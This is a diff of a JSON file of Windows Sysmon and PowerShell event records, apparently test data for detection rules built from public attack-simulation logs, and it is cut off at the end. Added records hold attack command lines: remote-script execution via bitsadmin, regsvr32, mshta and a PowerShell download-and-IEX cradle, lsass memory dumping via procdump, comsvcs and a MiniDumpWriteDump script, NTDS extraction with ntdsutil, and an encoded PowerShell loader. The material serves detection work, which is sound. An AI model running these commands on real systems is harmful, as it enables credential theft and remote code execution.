@@ -116,7 +116,17 @@
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:48:04.103366Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Windows\\Temp\\bitsadmin_flag.ps1\""
+    }
+  },
+  "112005": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-19T14:48:04.131410Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\bitsadmin.exe"
     }
   },
   "108500": {
@@ -136,20 +146,40 @@
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:50:55.991996Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic.exe process /FORMAT:list\""
     }
   },
-  "112005": {
+  "100001": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-19T14:50:56.047770Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+    }
+  },
+  "112006": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:53:42.815966Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"regsvr32.exe /s /u /i:C:\\AtomicRedTeam\\atomics\\T1117\\RegSvr32.sct scrobj.dll\""
     }
   },
-  "112006": {
+  "112007": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-19T14:53:42.841951Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\regsvr32.exe"
+    }
+  },
+  "112008": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -159,7 +189,7 @@
       "Image": "C:\\Windows\\System32\\regsvr32.exe"
     }
   },
-  "112007": {
+  "112009": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -186,7 +216,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:54:57.044623Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"AtomicRedTeam-WMIPersistence-Example\""
+    }
   },
   "104006": {
     "event_id": 20,
@@ -194,7 +226,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:54:58.819106Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"AtomicRedTeam-WMIPersistence-Example\""
+    }
   },
   "104007": {
     "event_id": 21,
@@ -206,14 +240,24 @@
       "Consumer": " \"\\\\\\\\.\\\\ROOT\\\\subscription:CommandLineEventConsumer.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\""
     }
   },
-  "112008": {
+  "112010": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T14:57:03.235828Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"certutil.exe -encode c:\\file.exe file.txt\""
+    }
+  },
+  "112011": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-19T14:57:03.309488Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\certutil.exe"
     }
   },
   "108501": {
@@ -234,20 +278,10 @@
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-19T15:11:26.642464Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
-    }
-  },
-  "108503": {
-    "event_id": 1,
-    "channel": "Microsoft-Windows-Sysmon/Operational",
-    "provider_name": "Microsoft-Windows-Sysmon",
-    "computer": "MSEDGEWIN10",
-    "timestamp": "2019-07-19T15:11:26.642464Z",
-    "event_data": {
       "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp\""
     }
   },
-  "108504": {
+  "108503": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -257,7 +291,7 @@
       "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"ntdsutil \u00e2\u20ac\u0153ac i ntds\u00e2\u20ac\u009d \u00e2\u20ac\u0153ifm\u00e2\u20ac\u009d \u00e2\u20ac\u0153create full C:\\Atomic_Red_Team q q\""
     }
   },
-  "112009": {
+  "112012": {
     "event_id": 11,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -267,27 +301,47 @@
       "Image": "C:\\Windows\\system32\\certutil.exe"
     }
   },
-  "112010": {
+  "112013": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-29T21:33:08.202018Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "cmd  /c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll"
     }
   },
-  "112011": {
+  "112014": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-29T21:33:08.446374Z",
+    "event_data": {
+      "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
+    }
+  },
+  "112015": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-29T21:33:18.286776Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "cmd  /c mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct\").Exec();close();"
     }
   },
-  "112012": {
+  "112016": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-29T21:33:18.583990Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\mshta.exe"
+    }
+  },
+  "112017": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -297,7 +351,7 @@
       "Image": "C:\\Windows\\System32\\mshta.exe"
     }
   },
-  "112013": {
+  "112018": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -308,7 +362,7 @@
       "DestinationPort": "443"
     }
   },
-  "112014": {
+  "112019": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -319,7 +373,7 @@
       "DestinationPort": "80"
     }
   },
-  "100001": {
+  "100002": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -329,17 +383,17 @@
       "CommandLine": "cmd  /c powershell -c \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\""
     }
   },
-  "112015": {
+  "112020": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "MSEDGEWIN10",
     "timestamp": "2019-07-29T21:33:44.268287Z",
     "event_data": {
-      "Image": "C:\\Windows\\System32\\cmd.exe"
+      "CommandLine": "cmd  /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll"
     }
   },
-  "100002": {
+  "100003": {
     "event_id": 11,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -349,7 +403,7 @@
       "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe"
     }
   },
-  "100003": {
+  "100004": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -360,7 +414,17 @@
       "DestinationPort": "443"
     }
   },
-  "112016": {
+  "112021": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-29T21:34:05.237600Z",
+    "event_data": {
+      "CommandLine": "cmd  /c rundll32 AllTheThings.dll,EntryPoint"
+    }
+  },
+  "112022": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -370,7 +434,7 @@
       "Image": "C:\\Windows\\System32\\rundll32.exe"
     }
   },
-  "112017": {
+  "112023": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -381,7 +445,7 @@
       "DestinationPort": "443"
     }
   },
-  "112018": {
+  "112024": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -390,6 +454,16 @@
     "event_data": {
       "Image": "C:\\Windows\\System32\\certutil.exe",
       "DestinationPort": "443"
+    }
+  },
+  "112025": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-07-29T21:34:25.659355Z",
+    "event_data": {
+      "Image": "C:\\Windows\\System32\\cmstp.exe"
     }
   },
   "112500": {
@@ -428,7 +502,7 @@
       "LogonType": "10"
     }
   },
-  "108505": {
+  "108504": {
     "event_id": 4625,
     "channel": "Security",
     "provider_name": "Microsoft-Windows-Security-Auditing",
@@ -436,7 +510,7 @@
     "timestamp": "2020-09-09T13:18:23.627952Z",
     "event_data": {}
   },
-  "108506": {
+  "108505": {
     "event_id": 8,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -446,7 +520,7 @@
       "TargetImage": "C:\\Windows\\System32\\lsass.exe"
     }
   },
-  "108507": {
+  "108506": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -457,7 +531,7 @@
       "GrantedAccess": "0x1f1fff"
     }
   },
-  "108508": {
+  "108507": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -467,7 +541,7 @@
       "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}"
     }
   },
-  "100004": {
+  "100005": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -477,7 +551,7 @@
       "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=="
     }
   },
-  "108509": {
+  "108508": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -488,7 +562,7 @@
       "GrantedAccess": "0x1000"
     }
   },
-  "108510": {
+  "108509": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -499,7 +573,7 @@
       "GrantedAccess": "0x1410"
     }
   },
-  "108511": {
+  "108510": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -510,7 +584,7 @@
       "GrantedAccess": "0x1fffff"
     }
   },
-  "108512": {
+  "108511": {
     "event_id": 11,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -520,7 +594,7 @@
       "Image": "C:\\Users\\IEUser\\Desktop\\procdump.exe"
     }
   },
-  "108513": {
+  "108512": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -528,6 +602,16 @@
     "timestamp": "2019-06-21T07:35:37.185149Z",
     "event_data": {
       "CommandLine": "Outflank-Dumpert.exe"
+    }
+  },
+  "108513": {
+    "event_id": 1,
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer": "MSEDGEWIN10",
+    "timestamp": "2019-08-30T12:54:08.354049Z",
+    "event_data": {
+      "CommandLine": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 4868 C:\\Windows\\System32\\notepad.bin full"
     }
   },
   "108514": {
@@ -541,16 +625,6 @@
     }
   },
   "108515": {
-    "event_id": 1,
-    "channel": "Microsoft-Windows-Sysmon/Operational",
-    "provider_name": "Microsoft-Windows-Sysmon",
-    "computer": "MSEDGEWIN10",
-    "timestamp": "2019-08-30T12:54:08.354049Z",
-    "event_data": {
-      "CommandLine": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 4868 C:\\Windows\\System32\\notepad.bin full"
-    }
-  },
-  "108516": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -569,7 +643,7 @@
     "timestamp": "2020-09-16T09:31:19.133272Z",
     "event_data": {}
   },
-  "112019": {
+  "112026": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -579,7 +653,7 @@
       "ImageLoaded": "C:\\Users\\bouss\\Downloads\\samir.exe"
     }
   },
-  "112020": {
+  "112027": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -590,7 +664,7 @@
       "DestinationPort": "1337"
     }
   },
-  "112021": {
+  "112028": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -600,7 +674,7 @@
       "ImageLoaded": "C:\\ProgramData\\chocolatey\\bin\\cdpsgshims.dll"
     }
   },
-  "112022": {
+  "112029": {
     "event_id": 13,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -610,7 +684,7 @@
       "TargetObject": "HKLM\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging"
     }
   },
-  "112023": {
+  "112030": {
     "event_id": 12,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -650,7 +724,7 @@
       "PipeName": "\\scerpc"
     }
   },
-  "112024": {
+  "112031": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -660,7 +734,7 @@
       "Image": "C:\\Windows\\System32\\msiexec.exe"
     }
   },
-  "112025": {
+  "112032": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -671,7 +745,7 @@
       "DestinationPort": "8181"
     }
   },
-  "112026": {
+  "112033": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -682,7 +756,7 @@
       "DestinationPort": "80"
     }
   },
-  "100005": {
+  "100006": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -692,7 +766,7 @@
       "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe"
     }
   },
-  "100006": {
+  "100007": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -703,7 +777,7 @@
       "DestinationPort": "80"
     }
   },
-  "100007": {
+  "100008": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -723,7 +797,7 @@
       "CommandLine": "cmd.exe /c vssadmin List Shadows| find \"Shadow Copy Volume\" "
     }
   },
-  "112027": {
+  "112034": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -742,7 +816,7 @@
     "timestamp": "2019-03-19T00:02:04.319945Z",
     "event_data": {}
   },
-  "112028": {
+  "112035": {
     "event_id": 3,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -753,7 +827,7 @@
       "DestinationPort": "55683"
     }
   },
-  "100008": {
+  "100009": {
     "event_id": 1,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -807,7 +881,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "IEWIN7",
     "timestamp": "2019-05-11T17:58:23.340659Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"BotConsumer23\""
+    }
   },
   "104013": {
     "event_id": 21,
@@ -825,7 +901,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "IEWIN7",
     "timestamp": "2019-05-11T17:58:39.746909Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"BotFilter82\""
+    }
   },
   "104015": {
     "event_id": 20,
@@ -833,7 +911,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "PC04.example.corp",
     "timestamp": "2019-04-03T18:11:54.178467Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"ProbeScriptFint\""
+    }
   },
   "104016": {
     "event_id": 21,
@@ -845,7 +925,7 @@
       "Consumer": " \"\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer.Name=\\\"ProbeScriptFint\\\"\""
     }
   },
-  "112029": {
+  "112036": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -855,7 +935,7 @@
       "ImageLoaded": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\pe386.dll"
     }
   },
-  "112030": {
+  "112037": {
     "event_id": 4781,
     "channel": "Security",
     "provider_name": "Microsoft-Windows-Security-Auditing",
@@ -863,7 +943,7 @@
     "timestamp": "2021-12-12T17:57:52.375105Z",
     "event_data": {}
   },
-  "108517": {
+  "108516": {
     "event_id": 10,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -935,16 +1015,6 @@
       "Image": "C:\\TOOLS\\PsExec64.exe"
     }
   },
-  "100009": {
-    "event_id": 4104,
-    "channel": "Microsoft-Windows-PowerShell/Operational",
-    "provider_name": "Microsoft-Windows-PowerShell",
-    "computer": "fs03vuln.offsec.lan",
-    "timestamp": "2022-01-24T20:11:11.361955Z",
-    "event_data": {
-      "ScriptBlockText": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\""
-    }
-  },
   "100010": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
@@ -956,6 +1026,16 @@
     }
   },
   "100011": {
+    "event_id": 4104,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "provider_name": "Microsoft-Windows-PowerShell",
+    "computer": "fs03vuln.offsec.lan",
+    "timestamp": "2022-01-24T20:11:11.361955Z",
+    "event_data": {
+      "ScriptBlockText": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\""
+    }
+  },
+  "100012": {
     "event_id": 4103,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -965,7 +1045,7 @@
       "Payload": "CommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"\r\n"
     }
   },
-  "100012": {
+  "100013": {
     "event_id": 4103,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6354,7 +6434,7 @@
       "ImagePath": "%SystemRoot%\\PSEXESVC.exe"
     }
   },
-  "108518": {
+  "108517": {
     "event_id": 7045,
     "channel": "System",
     "provider_name": "Service Control Manager",
@@ -6371,7 +6451,9 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "fs01.offsec.lan",
     "timestamp": "2021-06-09T19:29:58.239843Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"Evil\""
+    }
   },
   "104506": {
     "event_id": 19,
@@ -6379,7 +6461,29 @@
     "provider_name": "Microsoft-Windows-Sysmon",
     "computer": "fs01.offsec.lan",
     "timestamp": "2021-06-09T19:29:58.240353Z",
-    "event_data": {}
+    "event_data": {
+      "Name": " \"Evil\""
+    }
+  },
+  "108518": {
+    "event_id": 4103,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "provider_name": "Microsoft-Windows-PowerShell",
